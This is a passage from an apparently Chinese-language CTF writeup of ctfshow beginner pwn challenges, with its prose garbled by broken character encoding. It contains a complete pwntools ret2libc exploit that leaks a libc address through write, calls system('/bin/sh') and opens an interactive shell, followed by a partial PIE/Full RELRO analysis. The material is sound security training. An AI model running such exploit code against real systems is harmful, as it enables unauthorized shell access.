</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åŠ è½½ç›®æ ‡ç¨‹åºå’Œå¯¹åº”çš„libcåº“</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>                  <span class="c1"># åŠ è½½æ¼æ´ç¨‹åº</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/home/ctfshow/libc/32bit/libc-2.27.so&#39;</span><span class="p">)</span>  <span class="c1"># åŠ è½½å¯¹åº”çš„libcåº“</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–å…³é”®åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># ä»ç¨‹åºç¬¦å·è¡¨è·å–writeå‡½æ•°çš„PLTåœ°å€ï¼ˆç”¨äºè°ƒç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># ä»ç¨‹åºå…¨å±€åç§»è¡¨è·å–writeå‡½æ•°çš„GOTåœ°å€ï¼ˆå­˜å‚¨çœŸå®åœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>        <span class="c1"># è·å–å­˜åœ¨æ ˆæº¢å‡ºçš„ctfshowå‡½æ•°åœ°å€ï¼ˆç”¨äºäºŒæ¬¡æº¢å‡ºï¼‰</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">140</span>  <span class="c1"># æº¢å‡ºåç§»ï¼šç¼“å†²åŒºå¤§å° + EBPé•¿åº¦ï¼Œé€šè¿‡è°ƒè¯•ç¡®å®š</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ ç¬¬ä¸€ä¸ªpayloadï¼šæ³„æ¼writeå‡½æ•°çš„çœŸå®åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>               <span class="c1"># å¡«å……ç¼“å†²åŒºç›´åˆ°è¦†ç›–è¿”å›åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">),</span>              <span class="c1"># è¦†ç›–è¿”å›åœ°å€ä¸ºwrite@pltï¼Œè°ƒç”¨writeå‡½æ•°</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">ctfshow</span><span class="p">),</span>                <span class="c1"># writeæ‰§è¡Œå®Œåè·³å›ctfshowå‡½æ•°ï¼Œä»¥ä¾¿å†æ¬¡æ¥æ”¶è¾“å…¥</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>                      <span class="c1"># writeå‡½æ•°ç¬¬1ä¸ªå‚æ•°ï¼šæ–‡ä»¶æè¿°ç¬¦1ï¼ˆæ ‡å‡†è¾“å‡ºï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">),</span>              <span class="c1"># writeå‡½æ•°ç¬¬2ä¸ªå‚æ•°ï¼šè¦è¯»å–çš„åœ°å€ï¼ˆwriteçš„GOTè¡¨é¡¹ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>                       <span class="c1"># writeå‡½æ•°ç¬¬3ä¸ªå‚æ•°ï¼šè¯»å–å­—èŠ‚æ•°ï¼ˆ32ä½åœ°å€å 4å­—èŠ‚ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€ç¬¬ä¸€ä¸ªpayloadï¼Œè§¦å‘writeå‡½æ•°æ³„æ¼åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æ¥æ”¶æ³„æ¼çš„writeå‡½æ•°çœŸå®åœ°å€ï¼ˆ4å­—èŠ‚ï¼Œ32ä½ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;write address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">write_addr</span><span class="p">)</span>  <span class="c1"># æ‰“å°è·å–åˆ°çš„writeåœ°å€</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—libcåŸºåœ°å€åŠå…³é”®å‡½æ•°åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>  <span class="c1"># libcåŸºåœ°å€ = writeçœŸå®åœ°å€ - libcä¸­writeçš„åç§»</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>  <span class="c1"># systemå‡½æ•°åœ°å€ = åŸºåœ°å€ + systemåœ¨libcä¸­çš„åç§»</span>
</span></span><span class="line"><span class="cl"><span class="c1"># /bin/shå­—ç¬¦ä¸²åœ°å€ = åŸºåœ°å€ + /bin/shåœ¨libcä¸­çš„åç§»</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ‰“å°è®¡ç®—å¾—åˆ°çš„å…³é”®åœ°å€ï¼ˆè°ƒè¯•ç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc base: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;system address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;/bin/sh address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ ç¬¬äºŒä¸ªpayloadï¼šè°ƒç”¨system(&#34;/bin/sh&#34;)è·å–shell</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>               <span class="c1"># å†æ¬¡å¡«å……ç¼“å†²åŒºåˆ°è¿”å›åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span>            <span class="c1"># è¦†ç›–è¿”å›åœ°å€ä¸ºsystemå‡½æ•°åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span>             <span class="c1"># systemæ‰§è¡Œåçš„è¿”å›åœ°å€ï¼ˆéšæ„å¡«å……ï¼Œä¸å½±å“åŠŸèƒ½ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>              <span class="c1"># systemå‡½æ•°çš„å‚æ•°ï¼š/bin/shå­—ç¬¦ä¸²åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€ç¬¬äºŒä¸ªpayloadï¼Œè§¦å‘systemè°ƒç”¨</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œä¸è·å–åˆ°çš„shellè¿›è¡Œäº¤äº’</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ— å¤‡æ³¨ä»£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">140</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">ctfshow</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;write address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">write_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc base: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;system address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;/bin/sh address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># è·å–å…³é”®åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># ä»ç¨‹åºç¬¦å·è¡¨è·å–writeå‡½æ•°çš„PLTåœ°å€ï¼ˆç”¨äºè°ƒç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># ä»ç¨‹åºå…¨å±€åç§»è¡¨è·å–writeå‡½æ•°çš„GOTåœ°å€ï¼ˆå­˜å‚¨çœŸå®åœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>        <span class="c1"># è·å–å­˜åœ¨æ ˆæº¢å‡ºçš„ctfshowå‡½æ•°åœ°å€ï¼ˆç”¨äºäºŒæ¬¡æº¢å‡ºï¼‰</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„åœ°å€æ˜¯å¯ä»¥æ‰‹å†™çš„ï¼Œä½†æˆ‘ä¸å»ºè®®ï¼ŒAIç»™çš„æ˜¯ç¡®åˆ‡åœ°å€ï¼Œè¿™é‡Œæˆ‘ç»™æ”¹äº†ï¼Œä¸‹æ¬¡AIå†™è„šæœ¬ï¼Œåœ°å€ä¸€å®šä¸è¦æ‰‹åŠ¨ç¡¬å†™å‡ºæ¥ï¼Œå¸®AIæ”¹ä¸€ä¸‹æ”¹æˆè‡ªåŠ¨è·å–çš„ï¼Œæ¯”å¦‚ä¸Šé¢è¿™æ ·ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è·å–åœ°å€çš„ï¼Œè¿™æ ·æ¯”è¾ƒå‡†ç¡®ä¸ä¼šå‡ºé”™å´©æºƒã€‚</p>
<p>è¯´å®è¯ï¼Œç»™æˆ‘è‚¯å®šå†™ä¸åˆ°çš„ï¼Œä¸ç†Ÿæ‚‰ç¼–å†™pythonè¿œç¨‹äº¤äº’è„šæœ¬ï¼Œä½†æˆ‘å¯ä»¥è¯»æ‡‚ï¼Œæˆ‘å¯ä»¥ç”¨AIå¸®æˆ‘å†™ä»£ç ï¼Œæˆ‘å°±æŠŠæ„æ„¿å‘Šè¯‰å®ƒï¼ŒæŠŠIDAæ±‡ç¼–ä»£ç ä»¥åŠè·Ÿè¿›çš„å‡½æ•°å¤åˆ¶å‘ç»™å®ƒï¼Œé™„ä¸Šæˆ‘çš„æ€è·¯ï¼Œä¸å¦‚å·²ç»çŸ¥é“æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ç¼–å†™ret2libcã€çŸ¥é“å¼€å¯äº†å“ªäº›ä¿æŠ¤ã€ä¸€æ­¥æ­¥ä¿®æ”¹å¾—åˆ°çš„ã€‚</p>
<h3 id="pwn_031">PWN_031
</h3><p>é¢˜ç›®ï¼šå¼€å¯ ASLR å’Œ PIE çš„æƒ…å†µä¸‹ï¼Œä»å¯èƒ½è¢«åˆ©ç”¨ï¼›</p>
<p><strong>è¿™é“é¢˜æ˜¯è€ƒå¯Ÿå…³äºç¨‹åºåŸºå€å’Œè°ƒç”¨çº¦å®šä¸­ebxçš„ä½œç”¨ï¼Œéš¾åº¦åå¤§</strong></p>
<p>checksecä¸€ä¸‹ï¼Œæ— æ ˆä¿æŠ¤ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/83.png"
	width="1153"
	height="201"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/83_hu_7ff647734d8a0296.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/83_hu_441617b6b4ffee67.png 1024w"
	loading="lazy"
	
		alt="æ ˆæº¢å‡º"
	
	
		class="gallery-image" 
		data-flex-grow="573"
		data-flex-basis="1376px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/84.png"
	width="674"
	height="184"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/84_hu_b9ac56fd6a862ae6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/84_hu_3105db06c121094.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="366"
		data-flex-basis="879px"
	
></p>
<p>å‘ç°åŒæ ·çš„ä»£ç ï¼Œæœ‰æº¢å‡ºï¼Œä¼¼ä¹å¯ç”¨ä¸Šé¢˜çš„expï¼Œä¸è¿‡checksecçœ‹åˆ°çš„ä¿æŠ¤æ˜¯ä¸ä¸€æ ·çš„ï¼Œexpè‚¯å®šä¸ä¸€æ ·äº†&hellip;.</p>
<p>è¿è¡Œä¹‹åè«åå…¶å¦™ï¼Œä¼šæœ‰æŠ¥éšæœºåŒ–çš„åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/85.png"
	width="1055"
	height="680"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/85_hu_164fbd871315e02a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/85_hu_4528b5c9989ab6ae.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="155"
		data-flex-basis="372px"
	
></p>
<p>IDAçœ‹çœ‹mainå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/386.png"
	width="1025"
	height="445"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/386_hu_b8a13dd90c5bd111.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/386_hu_d9f2ac7bb375fd0c.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="230"
		data-flex-basis="552px"
	
></p>
<p>å™¢æˆ‘çŸ¥é“äº†è¿™æ˜¯mainå‡½æ•°çš„åœ°å€ï¼Œçœ‹äº†çœ‹å‘ç°å’Œä¸Šä¸€é¢˜çš„æ€è·¯å·®ä¸å¤šï¼Œä½†ä¿æŠ¤å¼€äº†ä¸ª<code>FULL RELRO</code>ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>Full RELROï¼ˆRELocation Read-Onlyï¼‰çš„æ ¸å¿ƒä½œç”¨æ˜¯ <strong>å°†ç¨‹åºçš„ GOT è¡¨ï¼ˆå…¨å±€åç§»è¡¨ï¼‰è®¾ç½®ä¸ºåªè¯»</strong>ï¼Œå½»åº•é˜»æ–­ â€œé€šè¿‡ä¿®æ”¹ GOT è¡¨åŠ«æŒå‡½æ•°æµç¨‹â€ çš„æ”»å‡»æ–¹å¼ï¼ˆå¦‚ ret2gotã€GOT è¦†å†™ï¼‰ã€‚å…·ä½“å½±å“åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>GOT è¡¨ä¸å¯å†™</strong>ï¼šåŸæœ¬å¯é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹ GOT è¡¨ä¸­å‡½æ•°çš„åœ°å€ï¼ˆæ¯”å¦‚å°† <code>printf</code> çš„ GOT é¡¹æ”¹ä¸º <code>system</code>ï¼‰ï¼Œä½† Full RELRO åï¼Œå†™å…¥ GOT è¡¨ä¼šè§¦å‘æ®µé”™è¯¯ï¼ˆæƒé™ä¸è¶³ï¼‰ï¼›</li>
<li><strong>åªèƒ½ â€œç›´æ¥è°ƒç”¨å‡½æ•°â€</strong>ï¼šæ”»å‡»è€…æ— æ³•å†é€šè¿‡ä¿®æ”¹ GOT è¡¨é—´æ¥åŠ«æŒæµç¨‹ï¼Œåªèƒ½é€šè¿‡æ ˆæº¢å‡º <strong>æ„é€ åˆæ³•çš„å‡½æ•°è°ƒç”¨æ ˆ</strong>ï¼ˆæ¯”å¦‚ç›´æ¥è°ƒç”¨ <code>write</code> æ³„éœ²åœ°å€ã€<code>system</code> æ‰§è¡Œå‘½ä»¤ï¼‰ï¼Œæ‰èƒ½å®Œæˆæ”»å‡»ã€‚</li>
</ol>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/387.png"
	width="712"
	height="1700"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/387_hu_489444a2eecfc295.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/387_hu_fc429075a81f6206.png 1024w"
	loading="lazy"
	
		alt="Full RELROä¿æŠ¤ä¸ebxå¯„å­˜å™¨çš„å…³è”é€»è¾‘"
	
	
		class="gallery-image" 
		data-flex-grow="41"
		data-flex-basis="100px"
	
></p>
<p>æ ¸å¿ƒé€»è¾‘å°±æ˜¯<strong>æ ˆæº¢å‡ºç ´åäº†æ ˆä¸Šä¿å­˜çš„åŸå§‹ <code>ebx</code> å€¼ï¼Œå¿…é¡»é€šè¿‡æº¢å‡ºæ•°æ®å°†å…¶è¦†ç›–å› â€œæ­£ç¡®çš„æ­£å¸¸å€¼â€ï¼Œæ‰èƒ½è®©åç»­å‡½æ•°è°ƒç”¨æ¢å¤æ­£å¸¸</strong>ã€‚</p>
</blockquote></blockquote>
<p>å›åˆ°æ­£é¢˜ï¼Œå› ä¸ºå¼€å¯äº†PIEå’ŒFULL RELROä¿æŠ¤ï¼Œä½¿æˆ‘ä»¬çš„å‡½æ•°è°ƒç”¨æ›´ç¹çäº†äº›ï¼Œä¸è¿‡æ€è·¯è¿˜æ˜¯é‚£æ ·ï¼Œåœ¨å‰é¢ä¸€ä¸ªmainå‡½æ•°çš„çœŸå®åœ°å€è¢«æ³„éœ²äº†ï¼Œè¿™é‡Œå°±å¯ä»¥å¾—åˆ°<code>elfåŸºå€</code>äº†ï¼Œè¿™ä¸ªå’Œ<code>libcåŸºå€</code>æ€§è´¨å·®ä¸å¤šçš„ï¼Œéƒ½æ˜¯åç§»é‡æ’å®šä¸å˜çš„ã€‚</p>
<p>elfåŸºå€è®¡ç®—ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf_base</span> <span class="o">=</span> <span class="n">main</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¥½ï¼Œç°åœ¨æ¥è®¡ç®—ebxå¯„å­˜å™¨çš„çœŸå®åœ°å€ï¼Œå…ˆæ‰¾å¤§æ¦‚ä½ç½®ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/388.png"
	width="993"
	height="316"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/388_hu_d4f1ab3589360d7a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/388_hu_27a486ba75a101b2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="314"
		data-flex-basis="754px"
	
></p>
<p>å½“ç„¶è¿™ä¸æ˜¯çœŸå®åœ°å€ï¼Œå› ä¸ºæœ‰PIEä¿æŠ¤ï¼Œä¸‹æ¬¡è¿˜æ˜¯éšæœºçš„ï¼Œåªæ˜¯æ‰¾å¤§æ¦‚ä½ç½®åœ¨å“ªã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/389.png"
	width="1350"
	height="345"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/389_hu_8c93369f3e0329c6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/389_hu_dcd233989a335c38.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="391"
		data-flex-basis="939px"
	
></p>
